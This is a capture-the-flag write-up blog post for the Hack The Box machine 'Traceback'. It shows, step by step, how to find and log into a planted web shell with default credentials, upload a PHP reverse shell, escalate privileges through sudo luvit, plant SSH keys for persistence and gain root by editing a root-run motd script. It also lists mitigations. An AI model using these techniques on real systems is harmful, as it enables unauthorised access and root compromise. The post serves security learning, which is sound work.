<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Traceback" /><meta property="og:locale" content="en" /><meta name="description" content="This is my write up for the HackTheBox Linux machine Traceback." /><meta property="og:description" content="This is my write up for the HackTheBox Linux machine Traceback." /><link rel="canonical" href="https://tid4l.github.io/posts/HTB-Traceback/" /><meta property="og:url" content="https://tid4l.github.io/posts/HTB-Traceback/" /><meta property="og:site_name" content="TidalSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-04-27T13:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack the Box - Traceback" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-04-27T13:00:00-05:00","datePublished":"2020-04-27T13:00:00-05:00","description":"This is my write up for the HackTheBox Linux machine Traceback.","headline":"Hack the Box - Traceback","mainEntityOfPage":{"@type":"WebPage","@id":"https://tid4l.github.io/posts/HTB-Traceback/"},"url":"https://tid4l.github.io/posts/HTB-Traceback/"}</script><title>Hack the Box - Traceback | TidalSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="TidalSec"><meta name="application-name" content="TidalSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avi/avi.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">TidalSec</a></div><div class="site-subtitle font-italic">Cybersecurity.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tid4l" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack the Box - Traceback</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Traceback</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Chris</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1588010400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-04-27 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1470 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><p>This is my write up for the HackTheBox Linux machine <em>Traceback</em>.</p><hr /><blockquote class="prompt-warning"><div><p>These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.</p></div></blockquote><p><img data-src="/assets/img/posts/htb/04-2020-2/info.PNG" alt="" data-proofer-ignore> <em>Task: Find <a href="#user-flag">user.txt</a> and <a href="#root-flag">root.txt</a></em></p><h2 id="penetration-methodologies"><span class="mr-2">Penetration Methodologies</span><a href="#penetration-methodologies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>Scanning</strong></p><ul><li>nmap</ul><p><strong>Enumeration</strong></p><ul><li><p>OSINT</p><li><p>dirbuster</p><li><p>Process Spying</p></ul><p><strong>Exploitation</strong></p><ul><li>Reverse shell</ul><p><strong>Priv Esc</strong></p><ul><li><p>GTFOBins</p><li><p>File permission abuse</p></ul><h2 id="user-flag"><span class="mr-2">User Flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s start by scanning the <em>Traceback</em> machine using <code class="language-plaintext highlighter-rouge">nmap</code>.</p><ul><li><p><strong>sC</strong>: Enable common scripts</p><li><p><strong>sV</strong>: version and service on the port</p><li><p><strong>O</strong>: remote OS detection using fingerprinting</p></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Sat Apr 25 13:14:52 2020 as: nmap -sC -sV -O -oA scan181 10.10.10.181</span>
Nmap scan report <span class="k">for </span>10.10.10.181
Host is up <span class="o">(</span>0.086s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span class="o">(</span>RSA<span class="o">)</span>
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Help us
4444/tcp open  krb524?
No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
TCP/IP fingerprint:
OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.80%E<span class="o">=</span>4%D<span class="o">=</span>8/17%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>33973%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>I%G<span class="o">=</span>Y%TM<span class="o">=</span>5F3B1A4
OS:7%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>FC%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10F%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS<span class="o">(</span>
OS:O1<span class="o">=</span>M54DST11NW7%O2<span class="o">=</span>M54DST11NW7%O3<span class="o">=</span>M54DNNT11NW7%O4<span class="o">=</span>M54DST11NW7%O5<span class="o">=</span>M54DST11
OS:NW7%O6<span class="o">=</span>M54DST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>7120%W2<span class="o">=</span>7120%W3<span class="o">=</span>7120%W4<span class="o">=</span>7120%W5<span class="o">=</span>7120%W6<span class="o">=</span>7120<span class="o">)</span>ECN<span class="o">(</span>
OS:R<span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>7210%O<span class="o">=</span>M54DNNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS
OS:%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>
OS:Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>
OS:R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T
OS:<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD<span class="o">=</span>
OS:S<span class="o">)</span>

Network Distance: 2 hops
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon Aug 17 19:01:11 2020 -- 1 IP address (1 host up) scanned in 42.92 seconds</span>
</pre></table></code></div></div><p>The open ports from our <code class="language-plaintext highlighter-rouge">nmap</code> results indicate that this is a web server (port 80), with SSH remote access (port 22) available.</p><p>Since we lack SSH credentials, let’s check out the webpage.</p><p><img data-src="/assets/img/posts/htb/04-2020-2/webpage.png" alt="" data-proofer-ignore></p><p>It looks like this site has already been hacked, and the attacker states that they have left a backdoor on the machine. There isn’t much more information or additional apparent webpages, so let’s check out the source for the page.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;center&gt;</span>
                <span class="nt">&lt;h1&gt;</span>This site has been owned<span class="nt">&lt;/h1&gt;</span>
                <span class="nt">&lt;h2&gt;</span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class="nt">&lt;/h2&gt;</span>
                <span class="nt">&lt;h3&gt;</span> - Xh4H - <span class="nt">&lt;/h3&gt;</span>
                <span class="c">&lt;!--Some of the best web shells that you might need ;)--&gt;</span>
        <span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</pre></table></code></div></div><p>Something interesting stands out, the attacker left a comment within the source HTML. Googling this comment returns a github page with <a href="https://github.com/TheBinitGhimire/Web-Shells">different web shells</a>. Judging by the message, we can assume that the attacker left one of these on the web server.</p><p>Let’s go ahead and create a list with the filenames for these shells and use <code class="language-plaintext highlighter-rouge">dirb</code> to enumerate through it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>dirb http://10.10.10.181/ webshell-list.txt
</pre></table></code></div></div><p>The webpage <code class="language-plaintext highlighter-rouge">http://10.10.10.181/smevk.php</code> successfully returns a status code 200, indicating that it is available. Let’s navigate to it in our web browser.</p><p><img data-src="/assets/img/posts/htb/04-2020-2/shell-login.png" alt="" data-proofer-ignore></p><p>Looks like we’ll need some credentials for the shell. Referring back to the source code for the shell, we find the default login information is admin:admin.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>//Make your setting here.
$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
$UserName = "admin";                                      //Your UserName here.
$auth_pass = "admin";                                  //Your Password.
</pre></table></code></div></div><p>Trying this, we log in successfully.</p><p><img data-src="/assets/img/posts/htb/04-2020-2/shell.png" alt="" data-proofer-ignore></p><p>The shell has a lot of options to sift through but the first thing that stands out is the capability to upload files through the shell interface. It also looks like this shell is running as user webadmin.</p><p>Command execution is limited through this shell, so let’s try to upload a reverse shell. We’ll use <a href="https://github.com/pentestmonkey/php-reverse-shell">this one</a> from pentestmonkey.</p><p>First, let’s start our listener for our reverse shell.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
</pre></table></code></div></div><p>After successfully uploading the shell, we can navigate to the page <code class="language-plaintext highlighter-rouge">http://10.10.10.181/php-reverse-shell.php</code>, which connects to our listener, providing us with a shell!</p><p>After having a look around, we find a text document named <code class="language-plaintext highlighter-rouge">note.txt</code> within the home directory of the user webadmin.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /home/webadmin
<span class="nv">$ </span><span class="nb">cat </span>note.txt
- sysadmin -
I have left a tool to practice Lua.
I<span class="s1">'m sure you know where to find it.
Contact me if you have any question.
</span></pre></table></code></div></div><p>Looks like the system admin left a tool for the web admin to practice Lua, a programming language, with. Let’s also check our privileges with the command <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p><p>The results indicate that we can run the <code class="language-plaintext highlighter-rouge">luvit</code> command as the user sysadmin without a password. A little research reveals that <a href="https://luvit.io/">luvit</a> is a tool used that provides asynchronous I/O for Lua and can run scripts in the CLI. Addtionally, <a href="https://gtfobins.github.io/gtfobins/lua/">GTFOBins</a> has some information regarding abusing Lua to escalate privileges.</p><p>We’ll create a Lua script that will open a shell as the user sysadmin. This should escalate our privileges.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">touch </span>pe.lua
<span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"os.execute('/bin/bash -i')"</span> <span class="o">&gt;</span> pe.lua
<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/sysadmin/luvit pe.lua
</pre></table></code></div></div><p>Success! We are now sysadmin. Let’s grab the user flag.</p><p><img data-src="/assets/img/posts/htb/04-2020-2/user-flag.png" alt="" data-proofer-ignore></p><h2 id="root-flag"><span class="mr-2">Root Flag</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now that we’ve successfully escalated privileges, let’s go ahead and create persistence, this will also assist us as move forward to getting root access.</p><p>We’ll add our public key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file within the hidden <code class="language-plaintext highlighter-rouge">.ssh</code> subdirectory in the home directory of sysadmin.</p><p>Linux Handbook has a <a href="https://linuxhandbook.com/add-ssh-public-key-to-server/">great article</a> on how we can do this. Having already generated the keys, the next step is for us to add our public key on the remote host. The we can connect via SSH.</p><p>As sysadmin and within the <code class="language-plaintext highlighter-rouge">.ssh</code> subdirectory, we will create the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, and use the <code class="language-plaintext highlighter-rouge">printf</code> command to append our public SSH key to the file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">touch </span>authorized_keys
<span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[my public ssh key]</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> authorized_keys
</pre></table></code></div></div><p>Now that we have more reliable persistence and the ability to transfer files, let’s upload pspy64, <a href="https://github.com/DominicBreuker/pspy">an unprivileged process spy</a>, so we can enumerate processes.</p><p>Let’s use secure copy with our SSH access to get it onto the box.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ scp pspy64 sysadmin@10.10.10.181:/tmp
</pre></table></code></div></div><p>Within our SSH session, we’ll run <code class="language-plaintext highlighter-rouge">pspy64</code>.</p><p><img data-src="/assets/img/posts/htb/04-2020-2/pspy.png" alt="" data-proofer-ignore></p><p>One process that stands out refers to the <code class="language-plaintext highlighter-rouge">motd.d</code> or “Message of the Day” daemon. Essentially, the backup “Message of the Day” is replacing the current <code class="language-plaintext highlighter-rouge">motd.d</code> every 30 seconds.</p><p>More useful info on <code class="language-plaintext highlighter-rouge">motd.d</code> can be found <a href="https://linuxconfig.org/how-to-change-welcome-message-motd-on-ubuntu-18-04-server">here</a>.</p><p><img data-src="/assets/img/posts/htb/04-2020-2/processes.png" alt="" data-proofer-ignore></p><p>This process certainly stands out. Let’s examine the <code class="language-plaintext highlighter-rouge">00-header</code> file, which contains the actual “Message of the Day”, a bit further.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ ls -al /etc/update-motd.d/00-header
-rwxrwxr-x 1 root sysadmin 981 Jun  2 10:40 /etc/update-motd.d/00-header
</pre></table></code></div></div><p>It looks like our header file can be edited by the sysadmin, yet is executed as root. This is a script, so we should be able to add commands that will execute as root and potentially escalate our privileges. Additionally, it looks like the previous attacker already edited this file with their own message.</p><p><img data-src="/assets/img/posts/htb/04-2020-2/motd.png" alt="" data-proofer-ignore></p><p>We’ll run the following command, which will append some script to the <code class="language-plaintext highlighter-rouge">motd.d</code> header file that, when executed, will add our public SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file of the root user.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>echo "printf \"\n[my public ssh key]\n\" &gt;&gt; /root/.ssh/authorized_keys" &gt;&gt; 00-header
</pre></table></code></div></div><p>The command within the <code class="language-plaintext highlighter-rouge">00-header</code> file will only execute when it is called, which occurs when a user logs in or connects via SSH. Additionally, the backup overwrites this file every 30 seconds, so we need to be quick.</p><p>Once we’ve run the command to append our public SSH key, we can SSH as sysadmin which will execute the command. Our public key should now be in the root user’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p><p>We can now successfully connect with SSH as root! Let’s capture the final flag.</p><p><img data-src="/assets/img/posts/htb/04-2020-2/root-flag.png" alt="" data-proofer-ignore></p><hr /><h2 id="mitigation"><span class="mr-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This box is interesting considering the scenario places us attempting access after another hack. It’s excellent practice from a recovery or forensic standpoint but it’s difficult to describe certain mitigation techniques as we do not know how the attacker gained their initial foothold. Regardless, I’ve included some mitigation techniques I’ve found regarding privilege escalation.</p><ul><li><p>Carefully consider the risks of providing other users with certain escalated privileges, especially when it allows commands to be run as other users. This has a risk of being exploited and resources like <a href="https://gtfobins.github.io/">GTFOBins</a> demonstrate the plethora of options to do this.</p><li><p>Avoid allowing lower privileged users the ability to edit scripts that are executed as a higher privileged user, especially as root. This can certainly lead to abuse if an attacker has access to the lower privileged account. Routine checks should be done to ensure that files don’t have dangerous or potentially exploitable permissions and the risks associated with any changes to the default permissions should be understood.</p></ul><h2 id="final-thoughts"><span class="mr-2">Final Thoughts</span><a href="#final-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This was only my second Linux machine at the time and I learned a lot, especially about Linux specific file structures and permissions. Doing some basic process enumeration was also beneficial and I enjoyed the challenge of using the resources I had to progress, without just finding a pre-made proof of concept or exploit.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Traceback - TidalSec&amp;url=https://tid4l.github.io/posts/HTB-Traceback/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Traceback - TidalSec&amp;u=https://tid4l.github.io/posts/HTB-Traceback/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://tid4l.github.io/posts/HTB-Traceback/&amp;text=Hack the Box - Traceback - TidalSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/First-Post-and-Obligatory-Blog-Walkthrough/">First Post and Obligatory Blog 